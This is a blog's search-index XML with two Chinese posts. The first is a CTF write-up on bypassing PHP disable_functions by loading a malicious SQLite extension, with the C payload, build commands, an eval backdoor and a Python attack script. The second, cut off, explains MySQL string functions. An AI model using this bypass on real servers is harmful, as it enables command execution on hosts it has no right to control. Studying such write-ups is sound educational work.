<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF 解题笔记：基于 PDO/Sqlite 扩展加载绕过 disable_functions</title>
      <link href="/2026/01/26/CTF%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-PDO-Sqlite%E6%89%A9%E5%B1%95%E5%8A%A0%E8%BD%BD%E7%BB%95%E8%BF%87disable_functions/"/>
      <url>/2026/01/26/CTF%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-PDO-Sqlite%E6%89%A9%E5%B1%95%E5%8A%A0%E8%BD%BD%E7%BB%95%E8%BF%87disable_functions/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-解题笔记：基于-PDO-Sqlite-扩展加载绕过-disable-functions"><a href="#CTF-解题笔记：基于-PDO-Sqlite-扩展加载绕过-disable-functions" class="headerlink" title="CTF 解题笔记：基于 PDO&#x2F;Sqlite 扩展加载绕过 disable_functions"></a>CTF 解题笔记：基于 PDO&#x2F;Sqlite 扩展加载绕过 disable_functions</h1><h2 id="一、-题目环境分析"><a href="#一、-题目环境分析" class="headerlink" title="一、 题目环境分析"></a>一、 题目环境分析</h2><ol><li><p><strong>入口代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cdcas&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>这是一个简单的后门，允许我们执行任意 PHP 代码。</li><li>经过测试，虽然可以使用 <code>phpinfo()</code>，但执行系统命令（如 <code>system(&quot;ls&quot;)</code>）时会提示函数被禁用或无回显，说明开启了 <code>disable_functions</code> 和可能的 <code>open_basedir</code> 限制。</li></ul></li><li><p><strong>目标</strong>：</p><ul><li>在不能使用 <code>system</code>、<code>exec</code>、<code>shell_exec</code> 等函数的情况下，执行系统命令。</li><li>找到并读取 Flag 文件。</li></ul></li></ol><h2 id="二、-攻击思路选择"><a href="#二、-攻击思路选择" class="headerlink" title="二、 攻击思路选择"></a>二、 攻击思路选择</h2><p>参考文档 <code>最新版 PHP 绕 open_basedir 和 disable_functions.pdf</code>，利用 PHP 的 <strong>PDO SQLite 扩展</strong>加载恶意 <code>.so</code> 文件的技术。</p><ul><li><strong>原理</strong>：<code>disable_functions</code> 只能禁用 PHP 解释器层面的函数。通过 <code>Pdo\Sqlite::loadExtension()</code> 加载恶意的 C 语言扩展，可以在 C 语言层面直接调用系统的 <code>system()</code> 函数，从而绕过 PHP 的限制。</li></ul><h2 id="三、-漏洞利用步骤"><a href="#三、-漏洞利用步骤" class="headerlink" title="三、 漏洞利用步骤"></a>三、 漏洞利用步骤</h2><h3 id="1-编写恶意-C-扩展代码-expolit-c"><a href="#1-编写恶意-C-扩展代码-expolit-c" class="headerlink" title="1. 编写恶意 C 扩展代码 (expolit.c)"></a>1. 编写恶意 C 扩展代码 (<code>expolit.c</code>)</h3><p>我们需要编写一个 SQLite 扩展，它在被加载时，读取一个包含命令的文件并执行。</p><p><strong>关键代码逻辑</strong>：</p><ul><li>定义入口函数 <code>sqlite3_exploit_init</code>。</li><li>读取 <code>/var/www/html/1.txt</code> (注意路径，详见下文) 中的命令。</li><li>调用 <code>system()</code> 执行该命令。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sqlite3_exploit_init</span><span class="params">(</span></span><br><span class="line"><span class="params">  sqlite3 *db,</span></span><br><span class="line"><span class="params">  <span class="type">char</span> **pzErrMsg,</span></span><br><span class="line"><span class="params">  <span class="type">const</span> sqlite3_api_routines *pApi</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// [重要] 必须使用绝对路径或正确的相对路径</span></span><br><span class="line">  <span class="comment">// 初版尝试使用 /tmp/1.txt 失败，可能是因为 open_basedir 限制或权限问题</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *command_file_path = <span class="string">&quot;/var/www/html/1.txt&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">char</span> command_buffer[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  FILE *file_handle;</span><br><span class="line"></span><br><span class="line">  file_handle = fopen(command_file_path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (file_handle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> SQLITE_OK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fgets(command_buffer, <span class="keyword">sizeof</span>(command_buffer), file_handle) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      command_buffer[<span class="built_in">strcspn</span>(command_buffer, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strlen</span>(command_buffer) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          system(command_buffer);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(file_handle);</span><br><span class="line">  <span class="keyword">return</span> SQLITE_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-编译-SO-文件"><a href="#2-编译-SO-文件" class="headerlink" title="2. 编译 SO 文件"></a>2. 编译 SO 文件</h3><p>由于编译器提示缺少头文件 <code>sqlite3ext.h</code>，需要先安装依赖库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 SQLite 开发包</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install libsqlite3-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译为共享库</span></span><br><span class="line">gcc -fPIC -shared expolit.c -o exploit.so -lsqlite3</span><br></pre></td></tr></table></figure><h3 id="3-传输-Payload-的策略"><a href="#3-传输-Payload-的策略" class="headerlink" title="3. 传输 Payload 的策略"></a>3. 传输 Payload 的策略</h3><p>由于 <code>exploit.so</code> 是二进制文件，无法直接通过 URL 传输。采用了 <strong>Base64 编码 + PHP 写入</strong> 的方式。</p><ol><li>将 <code>exploit.so</code> 转为 Base64 字符串：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -w 0 exploit.so &gt; payload.txt</span><br></pre></td></tr></table></figure></li><li>由于 Base64 字符串非常长（20KB+），直接在 Burp Suite 中容易因换行符或长度限制导致 PHP <code>Parse Error</code>。</li><li><strong>解决方案</strong>：编写 Python 脚本，利用 <code>requests</code> 库发送 POST 请求，确保 Base64 字符串被正确传输和还原。</li></ol><h3 id="4-编写攻击脚本-attack-py"><a href="#4-编写攻击脚本-attack-py" class="headerlink" title="4. 编写攻击脚本 (attack.py)"></a>4. 编写攻击脚本 (<code>attack.py</code>)</h3><p>这个脚本负责将 SO 文件和命令文件写入服务器，并触发扩展加载。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8.130.81.46:33845/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取并处理 Base64，去除换行符</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    base64_so = f.read().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 PHP Payload</span></span><br><span class="line">php_code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">$base64_so = \&quot;<span class="subst">&#123;base64_so&#125;</span>\&quot;;</span></span><br><span class="line"><span class="string">// 1. 将 SO 写入当前目录</span></span><br><span class="line"><span class="string">file_put_contents(\&quot;exploit.so\&quot;, base64_decode($base64_so));</span></span><br><span class="line"><span class="string">// 2. 将命令写入当前目录 (注意路径必须与 C 代码中一致)</span></span><br><span class="line"><span class="string">file_put_contents(\&quot;1.txt\&quot;, \&quot;cat /flag_cdcas &gt; result.txt\&quot;);</span></span><br><span class="line"><span class="string">// 3. 初始化 SQLite 并加载扩展</span></span><br><span class="line"><span class="string">$db = new Pdo\\Sqlite(&#x27;sqlite:memory:&#x27;);</span></span><br><span class="line"><span class="string">$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span></span><br><span class="line"><span class="string">$db-&gt;loadExtension(&#x27;exploit.so&#x27;);</span></span><br><span class="line"><span class="string">// 4. 读取执行结果</span></span><br><span class="line"><span class="string">echo file_get_contents(\&quot;result.txt\&quot;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=&#123;<span class="string">&quot;cdcas&quot;</span>: php_code&#125;)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><h2 id="四、-遇到的坑与排查"><a href="#四、-遇到的坑与排查" class="headerlink" title="四、 遇到的坑与排查"></a>四、 遇到的坑与排查</h2><ol><li><p><strong>文件路径陷阱</strong>：</p><ul><li><strong>现象</strong>：报错 <code>No such file or directory</code> 或无回显。</li><li><strong>原因</strong>：C 代码中硬编码了 <code>/tmp/1.txt</code>，但环境可能对 <code>/tmp</code> 有写入限制或权限隔离。</li><li><strong>解决</strong>：改用 Web 根目录 <code>/var/www/html/</code>（当前目录 <code>./</code>），这是必定可写的路径。同时修改 C 代码并重新编译。</li></ul></li><li><p><strong>PHP 语法错误</strong>：</p><ul><li><strong>现象</strong>：<code>Parse error: syntax error, unexpected end of file</code>。</li><li><strong>原因</strong>：Base64 字符串中包含了换行符，导致 PHP 认为字符串提前结束。</li><li><strong>解决</strong>：使用 Python 脚本生成 Payload，避免手动粘贴。</li></ul></li><li><p><strong>Flag 路径未知</strong>：</p><ul><li><strong>现象</strong>：执行 <code>cat /flag</code> 无回显。</li><li><strong>原因</strong>：Flag 文件不在 <code>/flag</code>，而是重命名了。</li><li><strong>解决</strong>：修改脚本中的命令为 <code>ls -la /</code>，发现根目录下有一个名为 <code>flag_cdcas</code> 的文件。随后修改命令为 <code>cat /flag_cdcas</code>。</li></ul></li></ol><h2 id="五、-最终执行与获取-Flag"><a href="#五、-最终执行与获取-Flag" class="headerlink" title="五、 最终执行与获取 Flag"></a>五、 最终执行与获取 Flag</h2><ol><li>修改 <code>attack.py</code> 中的命令为 <code>ls -la /</code>，发现目标文件。</li><li>再次修改为 <code>cat /flag_cdcas &gt; result.txt</code>。</li><li>运行脚本，成功获得回显。</li></ol><p><strong>Flag:</strong> <code>flag&#123;hello_world_935a00069646&#125;</code></p><h2 id="六、-总结"><a href="#六、-总结" class="headerlink" title="六、 总结"></a>六、 总结</h2><p>本题考察的核心技术点是 <strong>利用 PHP 扩展机制绕过 disable_functions</strong>。<br>通过编写 C 语言扩展，利用 <code>Pdo\Sqlite::loadExtension</code> 在进程空间内直接执行系统命令。难点在于二进制文件的传输（Base64处理）以及服务器文件路径的探测与适配。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
            <tag> SQLite </tag>
            
            <tag> 绕过 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL 常见函数笔记</title>
      <link href="/2026/01/18/SQL%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/"/>
      <url>/2026/01/18/SQL%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文整理了 MySQL 中常用的 SQL 函数，包括字符串处理、字符编码、长度计算和条件判断等，每个函数都配有通俗易懂的说明和实用示例。</p></blockquote><h2 id="一、常用内置函数：查看当前环境信息"><a href="#一、常用内置函数：查看当前环境信息" class="headerlink" title="一、常用内置函数：查看当前环境信息"></a>一、常用内置函数：查看当前环境信息</h2><p>这三个函数可以帮助你快速了解当前的数据库连接信息，非常实用！</p><h3 id="USER-查看当前登录账号"><a href="#USER-查看当前登录账号" class="headerlink" title="USER() - 查看当前登录账号"></a><code>USER()</code> - 查看当前登录账号</h3><p><strong>作用</strong>：返回当前连接的数据库账号和来源地址</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>();</span><br><span class="line"><span class="comment">-- 结果示例：root@localhost</span></span><br><span class="line"><span class="comment">-- 格式：账号名@来源地址</span></span><br></pre></td></tr></table></figure><h3 id="DATABASE-查看当前使用的数据库"><a href="#DATABASE-查看当前使用的数据库" class="headerlink" title="DATABASE() - 查看当前使用的数据库"></a><code>DATABASE()</code> - 查看当前使用的数据库</h3><p><strong>作用</strong>：返回当前正在使用的数据库名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE();</span><br><span class="line"><span class="comment">-- 结果示例：mydb</span></span><br><span class="line"><span class="comment">-- 注意：如果没有使用 USE 命令选择数据库，可能返回 NULL</span></span><br></pre></td></tr></table></figure><h3 id="VERSION-查看数据库版本"><a href="#VERSION-查看数据库版本" class="headerlink" title="VERSION() - 查看数据库版本"></a><code>VERSION()</code> - 查看数据库版本</h3><p><strong>作用</strong>：返回 MySQL 数据库的版本号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> VERSION();</span><br><span class="line"><span class="comment">-- 结果示例：8.0.33</span></span><br></pre></td></tr></table></figure><h3 id="一次性查询所有信息"><a href="#一次性查询所有信息" class="headerlink" title="一次性查询所有信息"></a>一次性查询所有信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>(), DATABASE(), VERSION();</span><br><span class="line"><span class="comment">-- 一次性获取账号、数据库名和版本号</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、字符串截取函数：灵活提取字符串片段"><a href="#二、字符串截取函数：灵活提取字符串片段" class="headerlink" title="二、字符串截取函数：灵活提取字符串片段"></a>二、字符串截取函数：灵活提取字符串片段</h2><p>字符串截取是 SQL 中最常用的操作之一，MySQL 提供了多种函数来实现这个功能。</p><h3 id="2-1-SUBSTRING-SUBSTR-MID-从指定位置截取"><a href="#2-1-SUBSTRING-SUBSTR-MID-从指定位置截取" class="headerlink" title="2.1 SUBSTRING() &#x2F; SUBSTR() &#x2F; MID() - 从指定位置截取"></a>2.1 <code>SUBSTRING()</code> &#x2F; <code>SUBSTR()</code> &#x2F; <code>MID()</code> - 从指定位置截取</h3><p>这三个函数在 MySQL 中<strong>完全等价</strong>，你可以根据习惯选择任意一个使用。</p><p><strong>语法格式</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SUBSTRING</span>(字符串, 起始位置)</span><br><span class="line"><span class="built_in">SUBSTRING</span>(字符串, 起始位置, 截取长度)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 以下写法效果相同</span></span><br><span class="line">SUBSTR(字符串, 起始位置, 截取长度)</span><br><span class="line">MID(字符串, 起始位置, 截取长度)</span><br></pre></td></tr></table></figure><p><strong>重要规则</strong>：</p><ul><li>⚠️ <strong>起始位置从 1 开始</strong>（不是 0！）</li><li>✅ 起始位置可以是负数：负数表示从字符串末尾往前数</li><li>✅ 如果省略截取长度，则取到字符串末尾</li></ul><p><strong>实用示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 从第1个字符开始，取3个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">1</span>, <span class="number">3</span>);   <span class="comment">-- 结果：abc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 从第3个字符开始，取到末尾</span></span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">3</span>);          <span class="comment">-- 结果：cdef</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 从第2个字符开始，取4个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> MID(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">2</span>, <span class="number">4</span>);          <span class="comment">-- 结果：bcde</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用负数：从倒数第2个字符开始取到末尾</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">-2</span>);      <span class="comment">-- 结果：ef</span></span><br></pre></td></tr></table></figure><h3 id="2-2-LEFT-从左边截取"><a href="#2-2-LEFT-从左边截取" class="headerlink" title="2.2 LEFT() - 从左边截取"></a>2.2 <code>LEFT()</code> - 从左边截取</h3><p><strong>作用</strong>：从字符串的左边开始截取指定长度的字符</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LEFT</span>(字符串, 长度)</span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">3</span>);           <span class="comment">-- 结果：abc（取左边3个字符）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="keyword">USER</span>(), <span class="number">4</span>);             <span class="comment">-- 取当前账号的前4个字符</span></span><br></pre></td></tr></table></figure><h3 id="2-3-RIGHT-从右边截取"><a href="#2-3-RIGHT-从右边截取" class="headerlink" title="2.3 RIGHT() - 从右边截取"></a>2.3 <code>RIGHT()</code> - 从右边截取</h3><p><strong>作用</strong>：从字符串的右边开始截取指定长度的字符</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RIGHT</span>(字符串, 长度)</span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">3</span>);          <span class="comment">-- 结果：def（取右边3个字符）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(VERSION(), <span class="number">3</span>);         <span class="comment">-- 取版本号的最后3个字符</span></span><br></pre></td></tr></table></figure><h3 id="2-4-常见组合用法"><a href="#2-4-常见组合用法" class="headerlink" title="2.4 常见组合用法"></a>2.4 常见组合用法</h3><h4 id="取第-n-位字符（只取1个字符）"><a href="#取第-n-位字符（只取1个字符）" class="headerlink" title="取第 n 位字符（只取1个字符）"></a>取第 n 位字符（只取1个字符）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;abcdef&#x27;</span>, <span class="number">4</span>, <span class="number">1</span>);   <span class="comment">-- 结果：d（第4个字符）</span></span><br></pre></td></tr></table></figure><h4 id="提取前缀或后缀"><a href="#提取前缀或后缀" class="headerlink" title="提取前缀或后缀"></a>提取前缀或后缀</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取数据库名的首字母</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(DATABASE(), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取账号的后缀部分（如 @localhost）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="keyword">USER</span>(), <span class="number">9</span>);</span><br></pre></td></tr></table></figure><hr><h2 id="三、字符编码相关函数：字符与数字的转换"><a href="#三、字符编码相关函数：字符与数字的转换" class="headerlink" title="三、字符编码相关函数：字符与数字的转换"></a>三、字符编码相关函数：字符与数字的转换</h2><h3 id="3-1-ASCII-获取字符的编码值"><a href="#3-1-ASCII-获取字符的编码值" class="headerlink" title="3.1 ASCII() - 获取字符的编码值"></a>3.1 <code>ASCII()</code> - 获取字符的编码值</h3><p><strong>作用</strong>：返回字符串<strong>第一个字符</strong>的 ASCII 编码值（数字）</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASCII(字符串)</span><br></pre></td></tr></table></figure><p><strong>重要规则</strong>：</p><ul><li>只取第一个字符（<code>&#39;abc&#39;</code> 只看 <code>&#39;a&#39;</code>）</li><li>空字符串 <code>&#39;&#39;</code> → 返回 <code>0</code></li><li><code>NULL</code> → 返回 <code>NULL</code></li></ul><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;A&#x27;</span>);        <span class="comment">-- 结果：65</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;a&#x27;</span>);        <span class="comment">-- 结果：97（小写字母）</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;0&#x27;</span>);        <span class="comment">-- 结果：48（数字0）</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;abc&#x27;</span>);      <span class="comment">-- 结果：97（只看第一个字符&#x27;a&#x27;）</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;&#x27;</span>);         <span class="comment">-- 结果：0</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="keyword">NULL</span>);       <span class="comment">-- 结果：NULL</span></span><br></pre></td></tr></table></figure><p><strong>配合截取函数使用</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取 &#x27;admin&#x27; 第1个字符的编码</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>));  <span class="comment">-- 结果：97</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取 &#x27;admin&#x27; 第2个字符的编码</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="number">2</span>, <span class="number">1</span>));  <span class="comment">-- 结果：100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前账号第1个字符的编码</span></span><br><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="built_in">SUBSTRING</span>(<span class="keyword">USER</span>(), <span class="number">1</span>, <span class="number">1</span>));</span><br></pre></td></tr></table></figure><h3 id="3-2-CHAR-将编码值转换为字符"><a href="#3-2-CHAR-将编码值转换为字符" class="headerlink" title="3.2 CHAR() - 将编码值转换为字符"></a>3.2 <code>CHAR()</code> - 将编码值转换为字符</h3><p><strong>作用</strong>：把数字编码转换成对应的字符（与 <code>ASCII()</code> 互逆）</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CHAR</span>(编码值)</span><br><span class="line"><span class="type">CHAR</span>(编码<span class="number">1</span>, 编码<span class="number">2</span>, 编码<span class="number">3</span>, ...)  <span class="comment">-- 可以一次转换多个字符</span></span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="type">CHAR</span>(<span class="number">65</span>);              <span class="comment">-- 结果：&#x27;A&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="type">CHAR</span>(<span class="number">97</span>,<span class="number">98</span>,<span class="number">99</span>);        <span class="comment">-- 结果：&#x27;abc&#x27;（97=a, 98=b, 99=c）</span></span><br><span class="line"><span class="keyword">SELECT</span> CONCAT(<span class="type">CHAR</span>(<span class="number">97</span>), <span class="string">&#x27;dm&#x27;</span>);<span class="comment">-- 结果：&#x27;adm&#x27;（拼接字符串）</span></span><br></pre></td></tr></table></figure><h3 id="ASCII-编码对照表"><a href="#ASCII-编码对照表" class="headerlink" title="ASCII 编码对照表"></a>ASCII 